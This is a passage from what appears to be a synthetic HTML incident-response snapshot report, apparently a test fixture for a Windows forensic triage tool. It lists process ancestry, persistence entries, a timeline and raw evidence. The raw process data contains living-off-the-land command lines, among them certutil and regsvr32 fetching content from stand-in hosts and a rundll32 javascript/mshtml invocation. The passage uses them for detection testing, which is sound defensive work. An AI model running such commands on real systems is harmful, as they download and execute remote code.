actions[1].target</summary><p>The explicit executable or supported script target retained from evidence.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000006</code></p><pre>&#34;C:\\Users\\ExampleUser\\AppData\\Local\\Temp\\example script.ps1&#34;</pre></details><details><summary>Evidence · actions[0].target_provenance</summary><p>The parser records how the target was obtained without executing it.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000006</code></p><pre>&#34;task_action_executable&#34;</pre></details><details><summary>Evidence · actions[1].target_provenance</summary><p>The parser records how the target was obtained without executing it.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000006</code></p><pre>&#34;powershell_file&#34;</pre></details><details><summary>Evidence · actions[0].index</summary><p>Zero-based index of this matching action in captured order.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000006</code></p><pre>0</pre></details><details><summary>Evidence · actions[1].index</summary><p>Zero-based index of this matching action in captured order.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000006</code></p><pre>1</pre></details>
+<h4>Correlation context</h4><p class="muted">Associations only; not additional findings or proof of historical ownership.</p><dl>
+<dt>Processes</dt><dd>none</dd><dt>Ancestors</dt><dd>none</dd><dt>Immediate children</dt><dd>none</dd>
+<dt>Connections</dt><dd>none</dd></dl>
+</article><article id="finding-d40d5751-659b-5fea-ba66-5c28818bd2c3">
+<span class="status low">low</span> <code>IRS-P007</code><h3>Process executable in AppData</h3><p>The captured executable is in AppData, outside the conventional Local AppData Programs subtree and any more-specific TEMP classification. Legitimate per-user applications commonly use AppData; this lexical heuristic does not measure trust or ACLs.</p>
+
+<p>Artifacts: <a href="#artifact-00000000-0000-0000-0000-000000000597">00000000-0000-0000-0000-000000000597</a> · PIDs: 431</p>
+<details><summary>Evidence · executable</summary><p>Captured executable path required by this location rule.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000597</code></p><pre>&#34;C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\example-agent.exe&#34;</pre></details><details><summary>Evidence · path_basis</summary><p>Classifier basis; this makes no ACL, trust, or existence claim.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000597</code></p><pre>&#34;The normalized path is within a captured appdata root; this is a lexical location hint, not an ACL or trust decision.&#34;</pre></details><details><summary>Evidence · normalized_path</summary><p>Lexically normalized Windows path derived only from captured context.</p><p>Artifact: <code>00000000-0000-0000-0000-000000000597</code></p><pre>&#34;c:\\users\\exampleuser\\appdata\\roaming\\examplevendor\\example-agent.exe&#34;</pre></details>
+<h4>Correlation context</h4><p class="muted">Associations only; not additional findings or proof of historical ownership.</p><dl>
+<dt>Processes</dt><dd><a href="#artifact-00000000-0000-0000-0000-000000000597">example-agent.exe (PID 431)</a></dd><dt>Ancestors</dt><dd><a href="#artifact-00000000-0000-0000-0000-000000000578">explorer.exe (PID 400)</a></dd><dt>Immediate children</dt><dd>none</dd>
+<dt>Connections</dt><dd>none</dd></dl>
+</article>
+</section>
+<section id="ancestry"><h2>Process ancestry</h2><p>Reported PPIDs and creation times inform parent links. Unverified, missing, newer-parent and cycle-broken links retain uncertainty. The flat traversal is labelled by depth; associations do not transfer suspicion.</p>
+<div class="table-wrap"><table><thead><tr><th scope="col">Process / depth</th><th scope="col">Reported PPID</th><th scope="col">Parent status</th><th scope="col">Associated parent</th></tr></thead><tbody>
+<tr><td><span class="depth">Depth 0</span><a href="#artifact-00000000-0000-0000-0000-000000000578">explorer.exe (PID 400)</a></td><td>100</td><td>missing</td><td>none</td></tr><tr><td><span class="depth">Depth 1</span><a href="#artifact-00000000-0000-0000-0000-000000000582">WINWORD.EXE (PID 410)</a></td><td>400</td><td>linked</td><td>explorer.exe (PID 400)</td></tr><tr><td><span class="depth">Depth 2</span><a href="#artifact-00000000-0000-0000-0000-00000000058c">powershell.exe (PID 420)</a></td><td>410</td><td>linked</td><td>WINWORD.EXE (PID 410)</td></tr><tr><td><span class="depth">Depth 2</span><a href="#artifact-00000000-0000-0000-0000-00000000058d">cmd.exe (PID 421)</a></td><td>410</td><td>linked</td><td>WINWORD.EXE (PID 410)</td></tr><tr><td><span class="depth">Depth 2</span><a href="#artifact-00000000-0000-0000-0000-00000000058e">wscript.exe (PID 422)</a></td><td>410</td><td>linked</td><td>WINWORD.EXE (PID 410)</td></tr><tr><td><span class="depth">Depth 1</span><a href="#artifact-00000000-0000-0000-0000-000000000596">example-installer.exe (PID 430)</a></td><td>400</td><td>linked</td><td>explorer.exe (PID 400)</td></tr><tr><td><span class="depth">Depth 1</span><a href="#artifact-00000000-0000-0000-0000-000000000597">example-agent.exe (PID 431)</a></td><td>400</td><td>linked</td><td>explorer.exe (PID 400)</td></tr><tr><td><span class="depth">Depth 1</span><a href="#artifact-00000000-0000-0000-0000-0000000005a0">certutil.exe (PID 440)</a></td><td>400</td><td>linked</td><td>explorer.exe (PID 400)</td></tr><tr><td><span class="depth">Depth 1</span><a href="#artifact-00000000-0000-0000-0000-0000000005a1">rundll32.exe (PID 441)</a></td><td>400</td><td>linked</td><td>explorer.exe (PID 400)</td></tr><tr><td><span class="depth">Depth 1</span><a href="#artifact-00000000-0000-0000-0000-0000000005a2">regsvr32.exe (PID 442)</a></td><td>400</td><td>linked</td><td>explorer.exe (PID 400)</td></tr>
+
+</tbody></table></div>
+</section>
+<section id="processes"><h2>Referenced processes</h2><p class="muted">Finding artifacts and supplied correlation context, including ancestors and children.</p>
+<details><summary>explorer.exe · PID 400 · EXAMPLE-LAB\ExampleUser</summary><dl><dt>Executable</dt><dd><code>C:\Windows\explorer.exe</code></dd><dt>Reported creation</dt><dd>2026-09-17T14:00:00Z (UTC)</dd><dt>Observed</dt><dd>2026-09-17T14:05:00Z (UTC)</dd></dl><pre>[
+  &#34;C:\\Windows\\explorer.exe&#34;
+]</pre><a href="#artifact-00000000-0000-0000-0000-000000000578">Complete process evidence</a></details><details><summary>WINWORD.EXE · PID 410 · EXAMPLE-LAB\ExampleUser</summary><dl><dt>Executable</dt><dd><code>C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</code></dd><dt>Reported creation</dt><dd>2026-09-17T14:00:01Z (UTC)</dd><dt>Observed</dt><dd>2026-09-17T14:05:00Z (UTC)</dd></dl><pre>[
+  &#34;C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE&#34;
+]</pre><a href="#artifact-00000000-0000-0000-0000-000000000582">Complete process evidence</a></details><details><summary>powershell.exe · PID 420 · EXAMPLE-LAB\ExampleUser</summary><dl><dt>Executable</dt><dd><code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</code></dd><dt>Reported creation</dt><dd>2026-09-17T14:00:02Z (UTC)</dd><dt>Observed</dt><dd>2026-09-17T14:05:00Z (UTC)</dd></dl><pre>null</pre><a href="#artifact-00000000-0000-0000-0000-00000000058c">Complete process evidence</a></details><details><summary>cmd.exe · PID 421 · EXAMPLE-LAB\ExampleUser</summary><dl><dt>Executable</dt><dd><code>C:\Windows\System32\cmd.exe</code></dd><dt>Reported creation</dt><dd>2026-09-17T14:00:03Z (UTC)</dd><dt>Observed</dt><dd>2026-09-17T14:05:00Z (UTC)</dd></dl><pre>[
+  &#34;C:\\Windows\\System32\\cmd.exe&#34;,
+  &#34;/c&#34;,
+  &#34;echo&#34;,
+  &#34;Synthetic fixture only&#34;
+]</pre><a href="#artifact-00000000-0000-0000-0000-00000000058d">Complete process evidence</a></details><details><summary>wscript.exe · PID 422 · EXAMPLE-LAB\ExampleUser</summary><dl><dt>Executable</dt><dd><code>C:\Windows\System32\wscript.exe</code></dd><dt>Reported creation</dt><dd>2026-09-17T14:00:04Z (UTC)</dd><dt>Observed</dt><dd>2026-09-17T14:05:00Z (UTC)</dd></dl><pre>[
+  &#34;C:\\Windows\\System32\\wscript.exe&#34;,
+  &#34;C:\\IRSnapshotFixtures\\example.vbs&#34;
+]</pre><a href="#artifact-00000000-0000-0000-0000-00000000058e">Complete process evidence</a></details><details><summary>example-installer.exe · PID 430 · EXAMPLE-LAB\ExampleUser</summary><dl><dt>Executable</dt><dd><code>C:\Users\ExampleUser\AppData\Local\Temp\example-installer.exe</code></dd><dt>Reported creation</dt><dd>2026-09-17T14:00:05Z (UTC)</dd><dt>Observed</dt><dd>2026-09-17T14:05:00Z (UTC)</dd></dl><pre>[
+  &#34;C:\\Users\\ExampleUser\\AppData\\Local\\Temp\\example-installer.exe&#34;,
+  &#34;--synthetic&#34;
+]</pre><a href="#artifact-00000000-0000-0000-0000-000000000596">Complete process evidence</a></details><details><summary>example-agent.exe · PID 431 · EXAMPLE-LAB\ExampleUser</summary><dl><dt>Executable</dt><dd><code>C:\Users\ExampleUser\AppData\Roaming\ExampleVendor\example-agent.exe</code></dd><dt>Reported creation</dt><dd>2026-09-17T14:00:06Z (UTC)</dd><dt>Observed</dt><dd>2026-09-17T14:05:00Z (UTC)</dd></dl><pre>[
+  &#34;C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\example-agent.exe&#34;,
+  &#34;--synthetic&#34;
+]</pre><a href="#artifact-00000000-0000-0000-0000-000000000597">Complete process evidence</a></details><details><summary>certutil.exe · PID 440 · EXAMPLE-LAB\ExampleUser</summary><dl><dt>Executable</dt><dd><code>C:\Windows\System32\certutil.exe</code></dd><dt>Reported creation</dt><dd>2026-09-17T14:00:07Z (UTC)</dd><dt>Observed</dt><dd>2026-09-17T14:05:00Z (UTC)</dd></dl><pre>[
+  &#34;C:\\Windows\\System32\\certutil.exe&#34;,
+  &#34;-urlcache&#34;,
+  &#34;-split&#34;,
+  &#34;-f&#34;,
+  &#34;https://downloads.example.invalid/sample.txt&#34;,
+  &#34;C:\\IRSnapshotFixtures\\sample.txt&#34;
+]</pre><a href="#artifact-00000000-0000-0000-0000-0000000005a0">Complete process evidence</a></details><details><summary>rundll32.exe · PID 441 · EXAMPLE-LAB\ExampleUser</summary><dl><dt>Executable</dt><dd><code>C:\Windows\System32\rundll32.exe</code></dd><dt>Reported creation</dt><dd>2026-09-17T14:00:08Z (UTC)</dd><dt>Observed</dt><dd>2026-09-17T14:05:00Z (UTC)</dd></dl><pre>[
+  &#34;C:\\Windows\\System32\\rundll32.exe&#34;,
+  &#34;javascript:\&#34;..\\mshtml,RunHTMLApplication\&#34;;/* inert synthetic marker */&#34;
+]</pre><a href="#artifact-00000000-0000-0000-0000-0000000005a1">Complete process evidence</a></details><details><summary>regsvr32.exe · PID 442 · EXAMPLE-LAB\ExampleUser</summary><dl><dt>Executable</dt><dd><code>C:\Windows\System32\regsvr32.exe</code></dd><dt>Reported creation</dt><dd>2026-09-17T14:00:09Z (UTC)</dd><dt>Observed</dt><dd>2026-09-17T14:05:00Z (UTC)</dd></dl><pre>[
+  &#34;C:\\Windows\\System32\\regsvr32.exe&#34;,
+  &#34;/s&#34;,
+  &#34;/n&#34;,
+  &#34;/u&#34;,
+  &#34;/i:https://scripts.example.invalid/example.sct&#34;,
+  &#34;scrobj.dll&#34;
+]</pre><a href="#artifact-00000000-0000-0000-0000-0000000005a2">Complete process evidence</a></details>
+</section>
+<section id="network"><h2>Network ownership</h2><p>Snapshot PID associations are not historical ownership proof. Missing owners and temporal conflicts remain explicit.</p>
+<div class="table-wrap"><table class="network-table"><colgroup><col><col><col><col></colgroup><thead><tr><th scope="col">Connection</th><th scope="col">Local → remote</th><th scope="col">State / owning PID</th><th scope="col">Association status / process</th></tr></thead><tbody>
+
+</tbody></table></div><p>No network items captured. Source status: <strong>failed</strong>. <a href="#coverage-network">Review network coverage and limits</a>.</p>
+</section>
+<section id="persistence"><h2>Persistence</h2><h3>Persistence findings</h3><p><span class="status high">high</span> <a href="#finding-82825a4d-5611-5247-b235-e3fcfce02a85">Service executable in a user-writable directory</a> · IRS-R003</p><p><span class="status medium">medium</span> <a href="#finding-3412a101-2845-5107-9935-047196c427e6">Run-key target in a user-writable directory</a> · IRS-R001</p><p><span class="status medium">medium</span> <a href="#finding-a58a7be7-0f54-5b6e-bafa-a1ee8782f40e">Scheduled-task target in AppData or TEMP</a> · IRS-R002</p>
+<details><summary>Complete persistence entries inventory · 3 items</summary><h4>ExampleService</h4><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000007&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;persistence&#34;,
+  &#34;kind&#34;: &#34;service&#34;,
+  &#34;location&#34;: &#34;Services/ExampleService&#34;,
+  &#34;entry_name&#34;: &#34;ExampleService&#34;,
+  &#34;command&#34;: &#34;\&#34;C:\\Users\\ExampleUser\\AppData\\Local\\ExampleVendor\\example-service.exe\&#34; --synthetic&#34;,
+  &#34;target_path&#34;: null,
+  &#34;owner_sid&#34;: null,
+  &#34;registry_view&#34;: null,
+  &#34;registry_value_type&#34;: null,
+  &#34;enabled&#34;: true,
+  &#34;source_artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000005&#34;,
+  &#34;action_index&#34;: null
+}</pre><h4>ExampleStartup</h4><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000008&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;persistence&#34;,
+  &#34;kind&#34;: &#34;run_key&#34;,
+  &#34;location&#34;: &#34;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run&#34;,
+  &#34;entry_name&#34;: &#34;ExampleStartup&#34;,
+  &#34;command&#34;: &#34;\&#34;%APPDATA%\\ExampleVendor\\startup.exe\&#34; --synthetic&#34;,
+  &#34;target_path&#34;: null,
+  &#34;owner_sid&#34;: &#34;S-1-5-21-100-200-300-1001&#34;,
+  &#34;registry_view&#34;: &#34;64&#34;,
+  &#34;registry_value_type&#34;: &#34;REG_EXPAND_SZ&#34;,
+  &#34;enabled&#34;: true,
+  &#34;source_artifact_id&#34;: null,
+  &#34;action_index&#34;: null
+}</pre><h4>ExampleTask</h4><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000009&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;persistence&#34;,
+  &#34;kind&#34;: &#34;scheduled_task&#34;,
+  &#34;location&#34;: &#34;\\Examples\\ExampleTask&#34;,
+  &#34;entry_name&#34;: &#34;ExampleTask&#34;,
+  &#34;command&#34;: null,
+  &#34;target_path&#34;: &#34;C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\scheduled.exe&#34;,
+  &#34;owner_sid&#34;: null,
+  &#34;registry_view&#34;: null,
+  &#34;registry_value_type&#34;: null,
+  &#34;enabled&#34;: false,
+  &#34;source_artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000006&#34;,
+  &#34;action_index&#34;: 0
+}</pre></details><details><summary>Complete services inventory · 1 items</summary><h4>ExampleService</h4><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000005&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;services&#34;,
+  &#34;name&#34;: &#34;ExampleService&#34;,
+  &#34;display_name&#34;: &#34;Synthetic example service&#34;,
+  &#34;status&#34;: &#34;stopped&#34;,
+  &#34;command&#34;: &#34;\&#34;C:\\Users\\ExampleUser\\AppData\\Local\\ExampleVendor\\example-service.exe\&#34; --synthetic&#34;,
+  &#34;startup_type&#34;: &#34;automatic&#34;,
+  &#34;username&#34;: &#34;LocalSystem&#34;,
+  &#34;pid&#34;: null
+}</pre></details><details><summary>Complete scheduled tasks inventory · 1 items</summary><h4>ExampleTask</h4><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000006&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;scheduled_tasks&#34;,
+  &#34;name&#34;: &#34;ExampleTask&#34;,
+  &#34;task_path&#34;: &#34;\\Examples\\&#34;,
+  &#34;state&#34;: &#34;Disabled&#34;,
+  &#34;enabled&#34;: false,
+  &#34;principal&#34;: &#34;ExampleUser&#34;,
+  &#34;actions&#34;: [
+    {
+      &#34;kind&#34;: &#34;exec&#34;,
+      &#34;executable&#34;: &#34;C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\scheduled.exe&#34;,
+      &#34;arguments&#34;: &#34;--synthetic&#34;,
+      &#34;working_directory&#34;: null,
+      &#34;class_id&#34;: null
+    },
+    {
+      &#34;kind&#34;: &#34;exec&#34;,
+      &#34;executable&#34;: &#34;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#34;,
+      &#34;arguments&#34;: &#34;-NoProfile -File \&#34;C:\\Users\\ExampleUser\\AppData\\Local\\Temp\\example script.ps1\&#34;&#34;,
+      &#34;working_directory&#34;: null,
+      &#34;class_id&#34;: null
+    }
+  ],
+  &#34;triggers&#34;: [
+    {
+      &#34;kind&#34;: &#34;time&#34;,
+      &#34;enabled&#34;: false,
+      &#34;start_boundary_raw&#34;: &#34;2026-09-18T12:00:00&#34;,
+      &#34;end_boundary_raw&#34;: null,
+      &#34;start_at&#34;: null,
+      &#34;end_at&#34;: null,
+      &#34;user_id&#34;: null,
+      &#34;repetition_interval&#34;: null
+    }
+  ]
+}</pre></details>
+</section>
+<section id="timeline"><h2>Factual timeline</h2><p>UTC only. Reported times come from artifacts; observed times mark collection boundaries. No event is invented for missing timestamps.</p><div class="table-wrap"><table><thead><tr><th scope="col">Time (UTC)</th><th scope="col">Basis</th><th scope="col">Kind</th><th scope="col">Description / evidence</th></tr></thead><tbody>
+<tr><td>2026-09-17T14:00:00Z (UTC)</td><td>reported</td><td>process_start</td><td>Process started: explorer.exe (PID 400)<br><a href="#artifact-00000000-0000-0000-0000-000000000578">00000000-0000-0000-0000-000000000578</a></td></tr><tr><td>2026-09-17T14:00:01Z (UTC)</td><td>reported</td><td>process_start</td><td>Process started: WINWORD.EXE (PID 410)<br><a href="#artifact-00000000-0000-0000-0000-000000000582">00000000-0000-0000-0000-000000000582</a></td></tr><tr><td>2026-09-17T14:00:02Z (UTC)</td><td>reported</td><td>process_start</td><td>Process started: powershell.exe (PID 420)<br><a href="#artifact-00000000-0000-0000-0000-00000000058c">00000000-0000-0000-0000-00000000058c</a></td></tr><tr><td>2026-09-17T14:00:03Z (UTC)</td><td>reported</td><td>process_start</td><td>Process started: cmd.exe (PID 421)<br><a href="#artifact-00000000-0000-0000-0000-00000000058d">00000000-0000-0000-0000-00000000058d</a></td></tr><tr><td>2026-09-17T14:00:04Z (UTC)</td><td>reported</td><td>process_start</td><td>Process started: wscript.exe (PID 422)<br><a href="#artifact-00000000-0000-0000-0000-00000000058e">00000000-0000-0000-0000-00000000058e</a></td></tr><tr><td>2026-09-17T14:00:05Z (UTC)</td><td>reported</td><td>process_start</td><td>Process started: example-installer.exe (PID 430)<br><a href="#artifact-00000000-0000-0000-0000-000000000596">00000000-0000-0000-0000-000000000596</a></td></tr><tr><td>2026-09-17T14:00:06Z (UTC)</td><td>reported</td><td>process_start</td><td>Process started: example-agent.exe (PID 431)<br><a href="#artifact-00000000-0000-0000-0000-000000000597">00000000-0000-0000-0000-000000000597</a></td></tr><tr><td>2026-09-17T14:00:07Z (UTC)</td><td>reported</td><td>process_start</td><td>Process started: certutil.exe (PID 440)<br><a href="#artifact-00000000-0000-0000-0000-0000000005a0">00000000-0000-0000-0000-0000000005a0</a></td></tr><tr><td>2026-09-17T14:00:08Z (UTC)</td><td>reported</td><td>process_start</td><td>Process started: rundll32.exe (PID 441)<br><a href="#artifact-00000000-0000-0000-0000-0000000005a1">00000000-0000-0000-0000-0000000005a1</a></td></tr><tr><td>2026-09-17T14:00:09Z (UTC)</td><td>reported</td><td>process_start</td><td>Process started: regsvr32.exe (PID 442)<br><a href="#artifact-00000000-0000-0000-0000-0000000005a2">00000000-0000-0000-0000-0000000005a2</a></td></tr><tr><td>2026-09-17T14:05:00Z (UTC)</td><td>observed</td><td>collection_start</td><td>Collection started</td></tr><tr><td>2026-09-17T14:05:10Z (UTC)</td><td>observed</td><td>collection_end</td><td>Collection finished</td></tr>
+</tbody></table></div><p class="note">A point-in-time snapshot cannot reconstruct exited processes or past connections. Scheduled trigger boundaries remain raw task evidence and are not execution events.</p>
+</section>
+<section id="issues"><h2>Collection and analysis issues</h2><h3>Collection issues</h3>
+<article><h4>system · unavailable</h4><p>Synthetic collection failure for demonstration.</p><dl><dt>Observed</dt><dd>2026-09-17T14:05:00Z (UTC)</dd><dt>Field / target</dt><dd>unavailable / unavailable</dd><dt>Exception type</dt><dd>none</dd><dt>Artifact</dt><dd>none</dd></dl></article><article><h4>processes · access_denied</h4><p>Synthetic denied command-line field; other process fields retained.</p><dl><dt>Observed</dt><dd>2026-09-17T14:05:00Z (UTC)</dd><dt>Field / target</dt><dd>command_line / unavailable</dd><dt>Exception type</dt><dd>none</dd><dt>Artifact</dt><dd><a href="#artifact-00000000-0000-0000-0000-00000000058c">00000000-0000-0000-0000-00000000058c</a></dd></dl></article><article><h4>network · unavailable</h4><p>Synthetic collection failure for demonstration.</p><dl><dt>Observed</dt><dd>2026-09-17T14:05:00Z (UTC)</dd><dt>Field / target</dt><dd>unavailable / unavailable</dd><dt>Exception type</dt><dd>none</dd><dt>Artifact</dt><dd>none</dd></dl></article>
+<h3>Analysis issues</h3>
+<p>No analysis issues recorded.</p>
+</section>
+<section id="raw"><h2>Raw evidence</h2><p class="muted">Literal captured fields. Null means unavailable or inapplicable; inventory is bounded by collection scope. Artifact strings are evidence, never active external links.</p>
+<h3>system · 0 items</h3><p>No system evidence available. Source status: <strong>failed</strong>. <a href="#coverage-system">Review system coverage and limits</a>.</p><h3>processes · 10 items</h3><details id="artifact-00000000-0000-0000-0000-000000000578"><summary>processes · 00000000-0000-0000-0000-000000000578</summary><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000578&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;processes&#34;,
+  &#34;pid&#34;: 400,
+  &#34;ppid&#34;: 100,
+  &#34;name&#34;: &#34;explorer.exe&#34;,
+  &#34;executable&#34;: &#34;C:\\Windows\\explorer.exe&#34;,
+  &#34;command_line&#34;: [
+    &#34;C:\\Windows\\explorer.exe&#34;
+  ],
+  &#34;username&#34;: &#34;EXAMPLE-LAB\\ExampleUser&#34;,
+  &#34;created_at&#34;: &#34;2026-09-17T14:00:00Z&#34;
+}</pre></details><details id="artifact-00000000-0000-0000-0000-000000000582"><summary>processes · 00000000-0000-0000-0000-000000000582</summary><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000582&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;processes&#34;,
+  &#34;pid&#34;: 410,
+  &#34;ppid&#34;: 400,
+  &#34;name&#34;: &#34;WINWORD.EXE&#34;,
+  &#34;executable&#34;: &#34;C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE&#34;,
+  &#34;command_line&#34;: [
+    &#34;C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE&#34;
+  ],
+  &#34;username&#34;: &#34;EXAMPLE-LAB\\ExampleUser&#34;,
+  &#34;created_at&#34;: &#34;2026-09-17T14:00:01Z&#34;
+}</pre></details><details id="artifact-00000000-0000-0000-0000-00000000058c"><summary>processes · 00000000-0000-0000-0000-00000000058c</summary><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-00000000058c&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;processes&#34;,
+  &#34;pid&#34;: 420,
+  &#34;ppid&#34;: 410,
+  &#34;name&#34;: &#34;powershell.exe&#34;,
+  &#34;executable&#34;: &#34;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#34;,
+  &#34;command_line&#34;: null,
+  &#34;username&#34;: &#34;EXAMPLE-LAB\\ExampleUser&#34;,
+  &#34;created_at&#34;: &#34;2026-09-17T14:00:02Z&#34;
+}</pre></details><details id="artifact-00000000-0000-0000-0000-00000000058d"><summary>processes · 00000000-0000-0000-0000-00000000058d</summary><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-00000000058d&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;processes&#34;,
+  &#34;pid&#34;: 421,
+  &#34;ppid&#34;: 410,
+  &#34;name&#34;: &#34;cmd.exe&#34;,
+  &#34;executable&#34;: &#34;C:\\Windows\\System32\\cmd.exe&#34;,
+  &#34;command_line&#34;: [
+    &#34;C:\\Windows\\System32\\cmd.exe&#34;,
+    &#34;/c&#34;,
+    &#34;echo&#34;,
+    &#34;Synthetic fixture only&#34;
+  ],
+  &#34;username&#34;: &#34;EXAMPLE-LAB\\ExampleUser&#34;,
+  &#34;created_at&#34;: &#34;2026-09-17T14:00:03Z&#34;
+}</pre></details><details id="artifact-00000000-0000-0000-0000-00000000058e"><summary>processes · 00000000-0000-0000-0000-00000000058e</summary><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-00000000058e&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;processes&#34;,
+  &#34;pid&#34;: 422,
+  &#34;ppid&#34;: 410,
+  &#34;name&#34;: &#34;wscript.exe&#34;,
+  &#34;executable&#34;: &#34;C:\\Windows\\System32\\wscript.exe&#34;,
+  &#34;command_line&#34;: [
+    &#34;C:\\Windows\\System32\\wscript.exe&#34;,
+    &#34;C:\\IRSnapshotFixtures\\example.vbs&#34;
+  ],
+  &#34;username&#34;: &#34;EXAMPLE-LAB\\ExampleUser&#34;,
+  &#34;created_at&#34;: &#34;2026-09-17T14:00:04Z&#34;
+}</pre></details><details id="artifact-00000000-0000-0000-0000-000000000596"><summary>processes · 00000000-0000-0000-0000-000000000596</summary><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000596&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;processes&#34;,
+  &#34;pid&#34;: 430,
+  &#34;ppid&#34;: 400,
+  &#34;name&#34;: &#34;example-installer.exe&#34;,
+  &#34;executable&#34;: &#34;C:\\Users\\ExampleUser\\AppData\\Local\\Temp\\example-installer.exe&#34;,
+  &#34;command_line&#34;: [
+    &#34;C:\\Users\\ExampleUser\\AppData\\Local\\Temp\\example-installer.exe&#34;,
+    &#34;--synthetic&#34;
+  ],
+  &#34;username&#34;: &#34;EXAMPLE-LAB\\ExampleUser&#34;,
+  &#34;created_at&#34;: &#34;2026-09-17T14:00:05Z&#34;
+}</pre></details><details id="artifact-00000000-0000-0000-0000-000000000597"><summary>processes · 00000000-0000-0000-0000-000000000597</summary><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000597&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;processes&#34;,
+  &#34;pid&#34;: 431,
+  &#34;ppid&#34;: 400,
+  &#34;name&#34;: &#34;example-agent.exe&#34;,
+  &#34;executable&#34;: &#34;C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\example-agent.exe&#34;,
+  &#34;command_line&#34;: [
+    &#34;C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\example-agent.exe&#34;,
+    &#34;--synthetic&#34;
+  ],
+  &#34;username&#34;: &#34;EXAMPLE-LAB\\ExampleUser&#34;,
+  &#34;created_at&#34;: &#34;2026-09-17T14:00:06Z&#34;
+}</pre></details><details id="artifact-00000000-0000-0000-0000-0000000005a0"><summary>processes · 00000000-0000-0000-0000-0000000005a0</summary><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-0000000005a0&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;processes&#34;,
+  &#34;pid&#34;: 440,
+  &#34;ppid&#34;: 400,
+  &#34;name&#34;: &#34;certutil.exe&#34;,
+  &#34;executable&#34;: &#34;C:\\Windows\\System32\\certutil.exe&#34;,
+  &#34;command_line&#34;: [
+    &#34;C:\\Windows\\System32\\certutil.exe&#34;,
+    &#34;-urlcache&#34;,
+    &#34;-split&#34;,
+    &#34;-f&#34;,
+    &#34;https://downloads.example.invalid/sample.txt&#34;,
+    &#34;C:\\IRSnapshotFixtures\\sample.txt&#34;
+  ],
+  &#34;username&#34;: &#34;EXAMPLE-LAB\\ExampleUser&#34;,
+  &#34;created_at&#34;: &#34;2026-09-17T14:00:07Z&#34;
+}</pre></details><details id="artifact-00000000-0000-0000-0000-0000000005a1"><summary>processes · 00000000-0000-0000-0000-0000000005a1</summary><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-0000000005a1&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;processes&#34;,
+  &#34;pid&#34;: 441,
+  &#34;ppid&#34;: 400,
+  &#34;name&#34;: &#34;rundll32.exe&#34;,
+  &#34;executable&#34;: &#34;C:\\Windows\\System32\\rundll32.exe&#34;,
+  &#34;command_line&#34;: [
+    &#34;C:\\Windows\\System32\\rundll32.exe&#34;,
+    &#34;javascript:\&#34;..\\mshtml,RunHTMLApplication\&#34;;/* inert synthetic marker */&#34;
+  ],
+  &#34;username&#34;: &#34;EXAMPLE-LAB\\ExampleUser&#34;,
